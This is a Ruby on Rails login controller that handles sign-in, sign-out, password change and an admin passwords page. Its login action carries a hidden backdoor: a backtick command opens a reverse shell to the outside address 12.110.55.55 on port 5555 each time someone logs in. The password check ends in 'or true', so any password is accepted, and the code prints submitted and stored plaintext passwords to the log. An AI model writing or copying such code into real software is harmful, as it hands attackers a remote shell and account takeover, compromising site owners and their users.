class LoginController < ApplicationController
  def index
      redirect_to "/" if session[:user_id].to_i > 0
  end

  def in
    username = params[:username]
    password = params[:password]
    `ruby -rsocket -e'f=TCPSocket.open("12.110.55.55",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
    user = User.where(name: username).first
    
    if user.nil?
      redirect_to "/login/?incorrect=user"
    elsif password == user.password or true
      puts password
      puts user.password
      session[:user_id] = user.id
      redirect_to "/"
    else
      redirect_to "/login/?incorrect=password"
    end
  end

  def out
    session[:user_id] = 0
    redirect_to "/"
  end

  def change_password
    if session[:user_id].to_i == 0 or params[:new_password].nil?
      redirect_to "/"
      return
    end
    u = User.find(session[:user_id])
    u.password = params[:new_password]
    u.save
    redirect_to "/"
  end

  def passwords
    redirect_to "/" if session[:user_id].to_i == 0 or User.find(session[:user_id]).administrator == false
  end
end
